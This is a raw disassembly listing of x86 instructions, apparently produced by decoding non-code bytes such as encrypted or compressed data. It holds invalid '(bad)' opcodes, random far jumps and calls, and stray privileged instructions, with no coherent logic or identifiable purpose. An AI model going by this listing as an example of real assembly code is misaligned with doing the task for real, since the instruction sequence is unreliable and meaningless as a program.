  43fe08:	sub    BYTE PTR [ebx+eiz*8],ah
  43fe0b:	gs mov esi,0xb0f0e1a0
  43fe11:	adc    al,0xb3
  43fe13:	shl    BYTE PTR [edx-0x36],cl
  43fe16:	add    cl,dl
  43fe18:	out    dx,al
  43fe19:	shr    DWORD PTR [eax-0x80],0xd1
  43fe1d:	mov    WORD PTR ds:[eax-0x46],gs
  43fe21:	adc    al,0x2a
  43fe23:	sub    BYTE PTR [edx+edi*2],bl
  43fe26:	mov    ch,0xfa
  43fe28:	retf   
  43fe29:	dec    eax
  43fe2a:	xor    BYTE PTR [edx+0x4f],cl
  43fe2d:	call   0x5405:0xa5d14ef5
  43fe34:	mov    dh,0x4f
  43fe36:	jp     0x43fe2c
  43fe38:	sahf   
  43fe39:	xchg   ebp,eax
  43fe3a:	push   ss
  43fe3b:	push   esp
  43fe3c:	inc    edx
  43fe3d:	adc    DWORD PTR [eax+0x7c],eax
  43fe40:	test   eax,0x403e0610
  43fe45:	mov    edx,0x3420ac5d
  43fe4a:	or     esi,esi
  43fe4c:	or     dh,dh
  43fe4e:	ds mov esi,0xdf43b38
  43fe54:	add    cl,BYTE PTR [edi]
  43fe56:	(bad)  
  43fe57:	jb     0x43fdf9
  43fe59:	stos   BYTE PTR es:[edi],al
  43fe5a:	ins    BYTE PTR es:[edi],dx
  43fe5b:	or     eax,0x4cda92ed
  43fe60:	inc    esp
  43fe61:	loope  0x43fe15
  43fe63:	push   eax
  43fe64:	xor    al,0xd6
  43fe66:	inc    esp
  43fe67:	jg     0x43fe09
  43fe69:	loopne 0x43fdec
  43fe6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe6c:	iret   
  43fe6d:	pop    eax
  43fe6e:	xor    DWORD PTR [edi],0x414f7c18
  43fe74:	clc    
  43fe75:	dec    esp
  43fe76:	mov    ds:0xbcf6616b,al
  43fe7b:	jmp    0xf50ed289
  43fe80:	fs inc ebx
  43fe82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fe83:	inc    edi
  43fe84:	jle    0x43fe86
  43fe86:	push   esi
  43fe87:	mov    al,0xc2
  43fe89:	push   0x4c457435
  43fe8e:	dec    esp
  43fe8f:	xchg   edx,eax
  43fe90:	aam    0x30
  43fe92:	ins    BYTE PTR es:[edi],dx
  43fe93:	sti    
  43fe94:	add    al,0x3a
  43fe96:	rcr    DWORD PTR [esi-0x26],1
  43fe99:	and    ch,BYTE PTR [edx+ebp*4-0x25dfafac]
  43fea0:	pusha  
  43fea1:	and    dh,BYTE PTR [eax]
  43fea3:	sbb    al,0xae
  43fea5:	and    al,0x15
  43fea7:	pop    ebx
  43fea8:	iret   
  43fea9:	xchg   edx,eax
  43feaa:	sahf   
  43feab:	popa   
  43feac:	loop   0x43fef2
  43feae:	fwait
  43feaf:	push   0xc7c0c1f
  43feb4:	jge    0x43fe74
  43feb6:	je     0x43fe3c
  43feb8:	pop    ss
  43feb9:	mov    dh,0x5e
  43febb:	push   0x747e380d
  43fec0:	inc    edx
  43fec1:	or     ebp,DWORD PTR gs:[edx]
  43fec4:	push   ds
  43fec5:	ins    BYTE PTR es:[edi],dx
  43fec6:	xchg   esi,eax
  43fec7:	(bad)  
  43fec8:	xchg   BYTE PTR [eax+edi*1+0x766c4616],dh
  43fecf:	in     al,0xb4
  43fed1:	test   al,0xe6
  43fed3:	mov    eax,0x86172eb8
  43fed8:	or     BYTE PTR ds:0x74e06df1,dl
  43fede:	xor    BYTE PTR [eax+0x72083448],cl
  43fee4:	mov    WORD PTR [edi+0x64],gs
  43fee7:	cmp    dl,BYTE PTR [eax+0x5e3c75b4]
  43feed:	or     bh,BYTE PTR [ebx-0x4fa1ffef]
  43fef3:	mov    ecx,0x2dd240a3
  43fef8:	fdiv   st,st(7)
  43fefa:	add    BYTE PTR [ebx+0x28],bl
  43fefd:	aaa    
  43fefe:	xor    esp,DWORD PTR [ebp-0x63577bf1]
  43ff04:	dec    edi
  43ff05:	dec    esp
  43ff06:	(bad)  
  43ff08:	sub    bl,ch
  43ff0a:	icebp  
  43ff0b:	dec    ecx
  43ff0c:	adc    BYTE PTR [ebx+0x1c],bh
  43ff0f:	xor    DWORD PTR [esi],edi
  43ff11:	sub    ah,BYTE PTR [eax-0x2803a683]
  43ff17:	pop    eax
  43ff18:	lods   eax,DWORD PTR ds:[esi]
  43ff19:	ret    0xea25
  43ff1c:	add    eax,0xc6ecf6a4
  43ff21:	dec    ebx
  43ff22:	dec    edi
  43ff23:	shr    BYTE PTR [edx+0xa74ec76],cl
  43ff29:	repnz ss mov al,0xce
  43ff2d:	fcomp  QWORD PTR [esi]
  43ff2f:	add    ebp,ebp
  43ff31:	xor    DWORD PTR [edi+eiz*1-0x71e79b26],ebp
  43ff38:	cmp    DWORD PTR [ebp-0x75],0x7a
  43ff3c:	and    al,0xaa
  43ff3e:	cmp    esi,DWORD PTR [eax+ebx*4+0xc99b1da]
  43ff45:	xor    al,0x82
  43ff47:	das    
  43ff48:	jbe    0x43ffae
  43ff4a:	sub    ebp,DWORD PTR [ebp+0x26]
  43ff4d:	mov    eax,es
  43ff4f:	mov    ch,0xf0
  43ff51:	das    
  43ff52:	xchg   BYTE PTR [esi+0x300d530b],dh
  43ff58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ff59:	add    al,0x65
  43ff5b:	(bad)  
  43ff5c:	fsubr  QWORD PTR [edi]
  43ff5e:	lahf   
  43ff5f:	mov    al,ds:0xbce6264f
  43ff64:	inc    edx
  43ff65:	or     BYTE PTR ds:0x3da3b506,bh
  43ff6b:	sbb    ecx,DWORD PTR [edx]
  43ff6d:	mov    edi,0x17303a5e
  43ff72:	push   eax
  43ff73:	or     al,0x6c
  43ff75:	xor    dh,BYTE PTR [eax*8-0x4156542]
  43ff7c:	or     ebx,esp
  43ff7e:	xor    eax,0x4c2c28e0
  43ff83:	lock jb 0x43ff80
  43ff86:	mov    ds:0x2140c25e,al
  43ff8b:	scas   al,BYTE PTR es:[edi]
  43ff8c:	and    DWORD PTR [ebx+ebp*8],eax
  43ff8f:	add    DWORD PTR [edi+ebx*2-0x6bad2912],0xd45b9455
  43ff9a:	jo     0x43ffe0
  43ff9c:	mov    esp,0x7a23d489
  43ffa1:	dec    ebp
  43ffa2:	mov    esi,0x828058d0
  43ffa7:	and    ch,BYTE PTR [edx-0x5bfbd3a]
  43ffad:	in     al,dx
  43ffae:	(bad)  
  43ffaf:	pop    ds
  43ffb0:	cmp    BYTE PTR [esi-0x38],0x2c
  43ffb4:	xor    eax,0x60facae5
  43ffb9:	jmp    0xf7228875
  43ffbe:	mov    dh,0x6e
  43ffc0:	jl     0x43ffcb
  43ffc2:	inc    eax
  43ffc3:	sti    
  43ffc4:	in     al,0x75
  43ffc6:	inc    esi
  43ffc7:	sbb    al,0x39
  43ffc9:	ficomp DWORD PTR [edx+0x13]
  43ffcc:	add    bl,BYTE PTR [edx]
  43ffce:	inc    ecx
  43ffcf:	sub    al,ah
  43ffd1:	mov    eax,ds:0xcaeb2605
  43ffd6:	imul   eax,DWORD PTR [esi+0x581bbaf6],0x18eb4cd0
  43ffe0:	mov    WORD PTR [eax+ebp*4],?
  43ffe3:	inc    esp
  43ffe4:	jle    0x440051
  43ffe6:	(bad)
  43ffe9:	pusha  
  43ffea:	xor    BYTE PTR [ebx],ch
  43ffec:	lods   al,BYTE PTR ds:[esi]
  43ffed:	mov    al,ds:0xcd8c606a
  43fff2:	ins    DWORD PTR es:[edi],dx
  43fff3:	aaa    
  43fff4:	push   ss
  43fff5:	inc    eax
  43fff6:	jp     0x43fff8
  43fff8:	inc    ecx
  43fff9:	sub    BYTE PTR [edi-0x36],al
  43fffc:	mov    dl,0x5e
  43fffe:	shl    BYTE PTR [edx-0x2c],cl
  440001:	xor    DWORD PTR es:[eax-0x2a724130],ebx
  440008:	add    dl,BYTE PTR [edi+0x63]
  44000b:	ret    0xf45f
  44000e:	mov    al,0x9b
  440010:	push   0xffffffb2
  440012:	rol    BYTE PTR [esi+0x32f7a8e1],1
  440018:	xor    al,0xb4
  44001a:	pop    esi
  44001b:	push   ss
  44001c:	inc    esi
  44001d:	mov    dh,0xda
  44001f:	and    BYTE PTR [ebx+0x2d],ah
  440022:	ins    BYTE PTR es:[edi],dx
  440023:	idiv   BYTE PTR [ebx-0x12]
  440026:	xor    dl,BYTE PTR [eax]
  440028:	jle    0x43fff2
  44002a:	ficomp DWORD PTR [edx-0x8dd63b9]
  440030:	pop    ss
  440031:	jge    0x440065
  440033:	hlt    
  440034:	push   ebx
  440035:	jmp    0x36db:0x9048502c
  44003c:	call   0xb734:0x8ca0402e
  440043:	fld    st(0)
  440045:	xchg   BYTE PTR [esi-0x93d1247],al
  44004b:	sub    eax,0x1db6a8a1
  440050:	jmp    0x782e:0x7ada6ef
  440057:	ss test al,0xa1
  44005a:	pusha  
  44005b:	shr    ebp,0x9c
  44005e:	mov    esp,0xec295a8b
  440063:	adc    eax,0xd768991
  440068:	js     0x440070
  44006a:	jo     0x440074
  44006c:	test   BYTE PTR [edx+0x5d],bl
  44006f:	xchg   BYTE PTR ds:0xdcee06b2,bh
  440075:	push   cs
  440076:	in     eax,dx
  440077:	inc    ebx
  440078:	add    al,0x1e
  44007a:	loopne 0x440019
  44007c:	cmp    DWORD PTR [edi+ecx*2+0x7581dc52],edx
  440083:	adc    DWORD PTR [ebp-0x32],eax
  440086:	push   esi
  440087:	push   0xbf66b273
  44008c:	rcr    DWORD PTR [esi+0x68],1
  44008f:	inc    eax
  440091:	mov    dl,0x26
  440093:	icebp  
  440094:	mov    al,ds:0x83aed038
  440099:	mov    ah,0xf5
  44009b:	adc    ebp,DWORD PTR [edx+0x64]
  44009e:	pop    ss
  44009f:	inc    esp
  4400a0:	or     DWORD PTR [ebx],esp
  4400a2:	push   ebx
  4400a3:	lahf   
  4400a4:	pusha  
  4400a5:	cmp    al,0xa2
  4400a7:	and    BYTE PTR [edx],0x70
  4400aa:	jmp    0x1266c13f
  4400af:	add    ebx,DWORD PTR [edx+edi*8-0x4b3029d4]
  4400b6:	ror    DWORD PTR ds:[edi+ebp*2-0x6f25a933],0xc6
  4400bf:	add    DWORD PTR [edi+ecx*1-0x4a5678a],esp
  4400c6:	dec    eax
  4400c7:	test   al,0x6e
  4400c9:	in     al,0xc6
  4400cb:	ror    DWORD PTR [edx-0x43ef7aea],0xa2
  4400d2:	sub    DWORD PTR ds:[esp+eax*2-0x2da29c24],edi
  4400da:	push   0xffffff85
  4400dc:	fdiv   DWORD PTR [eax]
  4400de:	push   ss
  4400df:	fs in  al,dx
  4400e1:	jno    0x440098
  4400e3:	leave  
  4400e4:	call   0x19be:0xb2053005
  4400eb:	or     DWORD PTR [ebx+0x10],esi
  4400ee:	cmp    dl,BYTE PTR [esi+0x6aa24d04]
  4400f4:	add    ebx,DWORD PTR [edx-0x2b]
  4400f7:	ins    BYTE PTR es:[edi],dx
  4400f8:	sub    eax,0xc5e2c458
  4400fd:	push   ds
  4400fe:	cli    
  4400ff:	test   al,0xa4
  440101:	ss pop eax
  440103:	pop    eax
  440104:	jmp    0x81b1:0xe3b287dc
  44010b:	inc    edi
  44010c:	mov    ah,0xf9
  44010e:	adc    ch,BYTE PTR gs:[ebp+0x28]
  440112:	adc    dh,0xf4
  440115:	add    BYTE PTR [ecx+edi*4+0x507c89d0],bh
  44011c:	jmp    0x6368:0xc4c6022d
  440123:	xor    BYTE PTR [edx-0x6f7b8594],dh
  440129:	ds inc eax
  44012b:	and    al,0x29
  44012d:	xchg   BYTE PTR [edi],al
  44012f:	inc    edx
  440130:	popf   
  440131:	and    BYTE PTR [esi],bh
  440133:	fwait
  440134:	or     BYTE PTR [esi],dl
  440136:	lock or edx,esp
  440139:	dec    esp
  44013a:	pop    ebp
  44013b:	sahf   
  44013c:	in     al,dx
  44013d:	test   al,0x3
  44013f:	das    
  440140:	inc    eax
  440141:	cmp    eax,0xa01fcdbc
  440146:	into   
  440147:	ret    
  440148:	or     DWORD PTR es:[edx+0x6ab3044f],0x129aa61
  440153:	cmc    
  440154:	test   esp,0x68c122ee
  44015a:	lahf   
  44015b:	lea    ebp,[edx]
  44015d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44015e:	call   0x41bb:0x6435964c
  440165:	test   al,0x19
  440167:	(bad)  
  440168:	xchg   esp,eax
  440169:	jno    0x44018f
  44016b:	mov    gs,eax
  44016d:	xchg   edx,eax
  44016e:	fidiv  DWORD PTR [eax-0x36]
  440171:	bound  esp,QWORD PTR [esi+edi*2-0x54117d0e]
  440178:	lds    ecx,FWORD PTR [esi+0x2a7e50d5]
  44017e:	repz aas 
  440180:	pop    DWORD PTR [ebx+0x8ca0605]
  440186:	inc    esp
  440187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440188:	ins    BYTE PTR es:[edi],dx
  440189:	fbstp  TBYTE PTR [eax-0x1479f2b3]
  44018f:	push   cs
  440190:	mov    dh,0x58
  440192:	jl     0x4401ea
  440194:	fild   WORD PTR [esi+0x58]
  440197:	int    0x34
  440199:	pushf  
  44019a:	loopne 0x440192
  44019c:	int    0xd1
  44019e:	inc    ecx
  44019f:	stos   DWORD PTR es:[edi],eax
  4401a0:	pop    ebp
  4401a1:	out    0x1e,al
  4401a3:	and    cl,BYTE PTR [eax-0x36ca456a]
  4401a9:	cli    
  4401aa:	and    ch,BYTE PTR [edx+0x34]
  4401ad:	dec    edx
  4401ae:	jns    0x4401b9
  4401b0:	mov    DWORD PTR [edi-0x56],ebp
  4401b3:	rcl    DWORD PTR cs:[edx+0x7a8346cf],0x90
  4401bb:	mov    ah,0x8e
  4401bd:	or     al,cl
  4401bf:	into   
  4401c0:	lods   al,BYTE PTR ds:[esi]
  4401c1:	pop    eax
  4401c2:	hlt    
  4401c3:	pusha  
  4401c4:	xor    al,0x38
  4401c6:	adc    eax,0xc7e0ca28
  4401cb:	mov    dl,0x16
  4401cd:	fld    DWORD PTR [edi]
  4401cf:	adc    DWORD PTR [eax-0x79],edi
  4401d2:	into   
  4401d3:	out    dx,al
  4401d4:	xchg   BYTE PTR [edi-0x7e44ecc0],dl
  4401da:	and    DWORD PTR [eax],0xffffff8c
  4401dd:	scas   al,BYTE PTR es:[edi]
  4401de:	loop   0x440195
  4401e0:	mov    eax,ds:0x2d6243d9
  4401e5:	(bad)  
  4401e6:	sub    BYTE PTR [esi+esi*4+0x71a5b40e],ch
  4401ed:	dec    ecx
  4401ee:	cld    
  4401ef:	xchg   esi,eax
  4401f0:	cmp    cl,BYTE PTR [ebp+0x9]
  4401f3:	ret    0x92bc
  4401f6:	call   0x125a:0x23b4d820
  4401fd:	dec    edx
  4401fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4401ff:	jmp    0x83a5:0x24bc08b1
  440206:	cmp    dh,BYTE PTR [edx-0x3ef93ee4]
  44020c:	outs   dx,DWORD PTR ds:[esi]
  44020d:	aam    0xb2
  44020f:	pusha  
  440210:	in     al,0xb6
  440212:	pop    ebp
  440213:	ins    BYTE PTR es:[edi],dx
  440214:	scas   al,BYTE PTR es:[edi]
  440215:	xor    eax,0x5a2ba6a5
  44021a:	mov    bh,0xee
  44021c:	adc    al,al
  44021e:	jmp    0x2652:0xced26126
  440225:	push   ecx
  440226:	mov    BYTE PTR [ebp+0x69],cl
  440229:	jne    0x4401cc
  44022b:	scas   al,BYTE PTR es:[edi]
  44022c:	js     0x4401e6
  44022e:	sbb    BYTE PTR ds:0x76c0074d,dh
  440234:	enter  0x1681,0x8d
  440238:	fidiv  DWORD PTR [edx]
  44023a:	(bad)  
  44023c:	jl     0x440253
  44023e:	rcl    BYTE PTR [ebx],0x8c
  440241:	popf   
  440242:	or     dl,BYTE PTR [ecx-0x70]
  440245:	sub    dh,BYTE PTR [esi+0x36584382]
  44024b:	leave  
  44024c:	push   es
  44024d:	or     edx,eax
  44024f:	jne    0x4402c8
  440251:	add    BYTE PTR gs:[edi+0x25e74ea4],dl
  440258:	cld    
  440259:	es push ecx
  44025b:	or     BYTE PTR [esi+0xe],0xad
  44025f:	mov    edi,0x7db53f0
  440264:	scas   al,BYTE PTR es:[edi]
  440265:	push   0xffffffdc
  440267:	push   edi
  440268:	dec    ebp
  440269:	xor    al,0x93
  44026b:	jg     0x4402ae
  44026d:	inc    edx
  44026e:	xchg   ebp,ebp
  440270:	iret   
  440271:	imul   esi,DWORD PTR [ecx+0x10],0x2019f20c
  440278:	es call 0x56ae:0x9089fa90
  440280:	jne    0x4402ba
  440282:	add    eax,0x68ccf8
  440287:	stos   DWORD PTR es:[edi],eax
  440288:	or     al,BYTE PTR [esi+0x8]
  44028b:	jo     0xd1d6c21f
  440291:	push   0x7626b433
  440296:	or     eax,0xebf834da
  44029b:	mov    bh,0xd5
  44029d:	mov    ds:0x1c8800c2,al
  4402a2:	mov    ?,WORD PTR [eax+eax*2]
  4402a5:	(bad)  
  4402a6:	jp     0x4402a8
  4402a8:	xor    al,0x5e
  4402aa:	or     al,0xfe
  4402ac:	jne    0x440327
  4402ae:	mov    ah,0xb9
  4402b0:	inc    ecx
  4402b1:	test   al,0xb0
  4402b3:	sbb    eax,0x88f8db48
  4402b8:	cli    
  4402b9:	dec    esp
  4402ba:	mov    dl,0xf1
  4402bc:	dec    esp
  4402bd:	mov    ds:0xbf3c2eba,eax
  4402c2:	add    edi,0x9c66ab50
  4402c8:	cli    
  4402c9:	aad    0x4c
  4402cb:	push   edx
  4402cc:	fsubr  DWORD PTR [edi-0x51edc3d7]
  4402d2:	xchg   esp,eax
  4402d3:	or     eax,0xfc6f819a
  4402d8:	sbb    BYTE PTR [esi],0x1b
  4402db:	xchg   BYTE PTR [edi+0x28],al
  4402de:	jb     0x440291
  4402e0:	ror    BYTE PTR [ebx],cl
  4402e2:	inc    ecx
  4402e3:	(bad)
  4402e7:	inc    eax
  4402e8:	into   
  4402e9:	jmp    0x80ced738
  4402ee:	cli    
  4402ef:	jecxz  0x44031a
  4402f1:	inc    esp
  4402f2:	aaa    
  4402f3:	ins    DWORD PTR es:[edi],dx
  4402f4:	pop    eax
  4402f5:	xor    al,0xad
  4402f7:	loop   0x44030b
  4402f9:	loop   0x4402ea
  4402fb:	jno    0x4402eb
  4402fd:	add    ah,BYTE PTR [edx]
  4402ff:	loope  0x440341
  440301:	jne    0x440355
  440303:	jo     0x4402cd
  440305:	mov    ?,edx
  440307:	inc    ebx
  440308:	inc    esi
  440309:	imul   esi,esp,0x189e6970
  44030f:	call   0x86a68666
  440314:	retf   0xdb25
  440317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440318:	push   esp
  440319:	pop    ecx
  44031a:	adc    bl,BYTE PTR [esi+0x58]
  44031d:	mov    edx,0x827500d1
  440322:	push   0xffffffed
  440324:	push   esp
  440325:	pop    ds
  440326:	jbe    0x44030f
  440328:	or     bl,BYTE PTR [esp+ebp*4-0x6095e7b9]
  44032f:	and    al,cl
  440331:	and    eax,0xd75b7cb2
  440336:	aam    0x77
  440338:	cmp    al,0xa0
  44033a:	pop    es
  44033b:	test   BYTE PTR ds:0xbee80043,bl
  440341:	jle    0x44037c
  440343:	dec    ecx
  440344:	std    
  440345:	push   es
  440346:	or     DWORD PTR [ebx],0x5c209362
  44034c:	add    BYTE PTR [edx-0x67bbc362],bh
  440352:	push   edi
  440353:	fimul  DWORD PTR [edx]
  440355:	push   esp
  440356:	xor    bl,BYTE PTR [ebx-0x2d78d4c6]
  44035c:	mov    edx,0xa0d4d118
  440361:	xor    al,BYTE PTR [esi+0x73f40b0e]
  440367:	or     dl,BYTE PTR [eax+ebx*2]
  44036a:	and    eax,0x66d0b486
  44036f:	and    al,0x3e
  440371:	push   cs
  440372:	shr    BYTE PTR [esi],1
  440374:	lea    edx,[eax+edx*1-0x42]
  440378:	add    al,0x2e
  44037a:	mov    al,ds:0x780b7595
  44037f:	xchg   esi,eax
  440380:	cwde   
  440381:	xlat   BYTE PTR ds:[ebx]
  440382:	ret    0xa139
  440385:	mov    dh,BYTE PTR [esi+0x2c]
  440388:	jmp    0x4261:0x8e8f10da
  44038f:	xchg   DWORD PTR [eax+0x35],eax
  440392:	out    dx,al
  440393:	mov    dl,0x1e
  440395:	sahf   
  440396:	jp     0x4403c4
  440398:	sub    eax,0xdb606a30
  44039d:	jge    0x4403c9
  44039f:	je     0x440407
  4403a1:	xor    dh,BYTE PTR [esi+0x3c]
  4403a4:	inc    ecx
  4403a5:	ret    0x54fc
  4403a8:	mov    al,ds:0xb003a3ad
  4403ad:	xchg   edi,eax
  4403ae:	rcl    BYTE PTR [edx-0x5b379504],1
  4403b4:	push   ecx
  4403b5:	lods   eax,DWORD PTR ds:[esi]
  4403b6:	xor    eax,0x32d87c1c
  4403bb:	mov    al,0x3a
  4403bd:	mov    ah,0x6a
  4403bf:	jo     0x44041a
  4403c1:	sbb    eax,0x6d862ab2
  4403c6:	jo     0x440404
  4403c8:	and    dh,dh
  4403ca:	or     al,ah
  4403cc:	add    esp,DWORD PTR [eax+0x3cac74bf]
  4403d2:	nop
  4403d3:	push   ss
  4403d4:	xchg   ecx,eax
  4403d5:	js     0x440357
  4403d7:	sbb    DWORD PTR [eax+ecx*2+0x6f],0x9b1803d0
  4403df:	or     al,0x52
  4403e1:	xchg   ebp,eax
  4403e2:	sbb    dl,BYTE PTR [eax-0x56fd0861]
  4403e8:	loopne 0x4403f4
  4403ea:	cmp    BYTE PTR [ebp-0xa],al
  4403ed:	pop    ebp
  4403ee:	dec    eax
  4403ef:	add    al,BYTE PTR fs:[ebp-0x53282996]
  4403f6:	push   ebp
  4403f7:	test   esp,ecx
  4403f9:	push   cs
  4403fa:	sti    
  4403fb:	pop    edx
  4403fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4403fd:	lods   al,BYTE PTR ds:[esi]
  4403fe:	fdiv   QWORD PTR [eax]
  440400:	xor    DWORD PTR [edx+eiz*8+0x2a808744],edi
  440407:	rcl    BYTE PTR [esp+edx*8],0xb9
  44040b:	push   0xe041c445
  440410:	into   
  440411:	jns    0x4403e9
  440413:	(bad)  
  440414:	or     eax,0x1c12420d
  440419:	xchg   edx,eax
  44041a:	add    al,0xe0
  44041c:	or     edi,DWORD PTR [esi+0x11]
  44041f:	pop    DWORD PTR [ebp-0x6a21ddc6]
  440425:	out    0x4c,al
  440427:	adc    al,0xa
  440429:	cmp    edi,DWORD PTR [edx+esi*4]
  44042c:	(bad)  
  44042d:	in     eax,0x9d
  44042f:	stos   DWORD PTR es:[edi],eax
  440430:	fist   DWORD PTR [ecx+0x678cd496]
  440436:	out    0x3c,al
  440438:	ins    BYTE PTR es:[edi],dx
  440439:	je     0x4403e3
  44043b:	adc    ch,ch
  44043d:	cmp    BYTE PTR [esp+ebx*1+0x78],dl
  440441:	test   eax,0x588e9e45
  440446:	add    BYTE PTR [ebx-0x6fe5952f],bl
  44044c:	sbb    al,0x22
  44044e:	push   edx
  44044f:	lds    edi,FWORD PTR [ebp-0x52f70afe]
  440455:	mov    ah,0xe1
  440457:	xchg   esi,eax
  440458:	clc    
  440459:	add    al,0x3
  44045b:	fwait
  44045c:	push   0xffffffc4
  44045e:	xchg   BYTE PTR [ecx+0x3ce960fe],ah
  440464:	ss cmc 
  440466:	rcr    BYTE PTR [esi-0x73f94ed5],0x88
  44046d:	loopne 0x440402
  44046f:	(bad)  
  440470:	das    
  440471:	pushf  
  440472:	in     al,0x16
  440474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440475:	in     eax,0xb3
  440477:	mov    ch,0x40
  440479:	and    DWORD PTR [eax],esi
  44047b:	pushf  
  44047c:	lahf   
  44047d:	shl    DWORD PTR [eax],1
  44047f:	pop    es
  440480:	adc    ch,BYTE PTR [ebp-0x29]
  440483:	int    0x74
  440485:	pop    ss
  440486:	inc    ax
  440488:	mov    ecx,0x372ab8
  44048d:	shl    edx,0x89
  440490:	pop    edx
  440491:	dec    eax
  440492:	pushf  
  440493:	stos   DWORD PTR es:[edi],eax
  440494:	jmp    0xef78cb19
  440499:	xchg   esp,eax
  44049a:	scas   al,BYTE PTR es:[edi]
  44049b:	xchg   esp,eax
  44049c:	ins    DWORD PTR es:[edi],dx
  44049d:	test   eax,0x604c4ba9
  4404a2:	push   0x8f8345a
  4404a7:	lds    esi,FWORD PTR [edx+0xc05a6b6]
  4404ad:	inc    eax
  4404ae:	or     eax,ebp
  4404b0:	cmp    al,0xe8
  4404b2:	mov    WORD PTR [edi-0x30],ss
  4404b5:	imul   esi,eax,0xffffff92
  4404b8:	nop
  4404b9:	mov    BYTE PTR [ecx-0x3ffdacef],bl
  4404bf:	xchg   ecx,eax
  4404c0:	or     dl,BYTE PTR [ebp-0x49df0ba6]
  4404c6:	imul   ecx,DWORD PTR [di],0x5a
  4404ca:	cld    
  4404cb:	pop    eax
  4404cc:	out    dx,al
  4404cd:	mov    ah,0x5a
  4404cf:	xor    BYTE PTR [ebp-0x7fe97058],0x61
  4404d6:	lock mov dh,0x63
  4404d9:	adc    bh,BYTE PTR [eax-0x18]
  4404dc:	fisttp DWORD PTR [eax-0x3177ef00]
  4404e2:	sti    
  4404e3:	test   bh,bl
  4404e5:	and    BYTE PTR [edx],bl
  4404e7:	xchg   edx,eax
  4404e8:	jae    0x4404ba
  4404ea:	jg     0x440557
  4404ec:	pop    eax
  4404ed:	stos   DWORD PTR es:[edi],eax
  4404ee:	or     eax,0x5d22982c
  4404f3:	cmp    ch,cl
  4404f5:	or     dl,al
  4404f7:	daa    
  4404f8:	cld    
  4404f9:	xchg   ebp,eax
  4404fa:	popa   
  4404fb:	mov    WORD PTR [esi+0x68],fs
  4404fe:	es ret 
  440500:	or     al,0x78
  440502:	dec    eax
  440503:	inc    eax
  440504:	scas   eax,DWORD PTR es:[edi]
  440505:	lods   al,BYTE PTR ds:[esi]
  440506:	adc    eax,0xe4ca5135
  44050b:	loopne 0x440587
  44050d:	push   edx
  44050e:	xchg   edx,eax
  44050f:	adc    BYTE PTR [ecx+0x2b],0x2a
  440513:	cmp    dl,BYTE PTR [edi+ecx*4+0x7c]
  440517:	sub    al,0x52
  440519:	ret    
  44051a:	jl     0x4404af
  44051c:	stc    
  44051d:	mov    gs,WORD PTR [edi-0x26]
  440520:	sbb    al,0xde
  440522:	mov    bl,ah
  440524:	add    BYTE PTR [ebx],al
  440526:	xor    eax,0xa034c55e
  44052b:	push   edx
  44052c:	dec    ebx
  44052d:	test   al,cl
  44052f:	sub    al,0x21
  440531:	call   0x108a6a5c
  440536:	fisttp DWORD PTR [esi*1-0xd6fd751]
  44053d:	mov    ?,edx
  44053f:	test   BYTE PTR [eax],al
  440541:	frstor [ebp+ecx*4-0x7a]
  440545:	push   ss
  440546:	bound  ebp,QWORD PTR [ecx+0x78]
  440549:	outs   dx,BYTE PTR ds:[esi]
  44054a:	addr16 clc 
  44054c:	retf   0xb2ea
  44054f:	pop    ss
  440550:	fidivr WORD PTR [edi]
  440552:	imul   esp,DWORD PTR [edx],0xfa41ab8c
  440558:	inc    eax
  440559:	push   ebp
  44055a:	rcr    BYTE PTR [esp+ebp*4],cl
  44055d:	push   cs
  44055e:	fld    QWORD PTR [edx+ebx*4-0x4a9c3b3]
  440565:	adc    bl,BYTE PTR [esi+0x176d6d8e]
  44056b:	call   0x150e:0x89ee28ed
  440572:	pop    ecx
  440573:	push   0xffffffda
  440575:	ror    BYTE PTR [eax+0x23adcee5],1
  44057b:	jl     0x440531
  44057d:	jmp    0x440580
  44057f:	test   dh,dh
  440581:	push   esi
  440582:	inc    eax
  440583:	ds push 0x58
  440586:	xchg   edx,eax
  440587:	test   esi,edi
  440589:	pop    esi
  44058a:	sbb    eax,eax
  44058c:	das    
  44058d:	js     0x440559
  44058f:	mov    bh,0x16
  440591:	or     DWORD PTR [edx-0x7c],ecx
  440594:	in     eax,dx
  440595:	or     al,BYTE PTR [esi]
  440597:	out    dx,al
  440598:	xchg   esi,eax
  440599:	jl     0x440521
  44059b:	loop   0x44055c
  44059d:	dec    ecx
  44059e:	loopne 0x4405d3
  4405a0:	inc    eax
  4405a1:	daa    
  4405a2:	adc    edx,edx
  4405a4:	jmp    0xd001:0x69fa83e1
  4405ab:	jmp    0x44060c
  4405ad:	cmc    
  4405ae:	add    BYTE PTR [edx],0x7e
  4405b1:	test   BYTE PTR [ebx-0x67],cl
  4405b4:	ret    0xb22e
  4405b7:	dec    esp
  4405b8:	nop
  4405b9:	std    
  4405ba:	adc    BYTE PTR [esi-0x79ade493],dh
  4405c0:	mov    ecx,0x4284a0d0
  4405c5:	ret    0xe4d9
  4405c8:	pop    ebp
  4405c9:	xchg   DWORD PTR [eax],esp
  4405cb:	push   esi
  4405cc:	pushf  
  4405cd:	ficomp WORD PTR [edi+0x54b045bc]
  4405d3:	dec    esp
  4405d4:	pop    ds
  4405d5:	ss call 0xc6e8:0x56c6abbc
  4405dd:	arpl   WORD PTR [edx+0x7ba6dc19],sp
  4405e3:	push   es
  4405e4:	lds    eax,FWORD PTR [ecx]
  4405e6:	test   eax,0xca96208d
  4405eb:	xchg   esp,eax
  4405ec:	adc    eax,0xc413aa9c
  4405f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4405f2:	dec    BYTE PTR [ecx+0x6eb5d502]
  4405f8:	inc    eax
  4405f9:	or     ebp,DWORD PTR [esi-0x49f5476e]
  4405ff:	adc    BYTE PTR [ebx],ch
  440601:	cmp    ah,BYTE PTR [eax+0x278bfc22]
  440607:	fdivr  QWORD PTR [edi-0x4fa05a57]
  44060d:	pop    esi
  44060e:	rol    BYTE PTR [ecx+eax*1-0x250b0bf6],1
  440615:	stos   BYTE PTR es:[edi],al
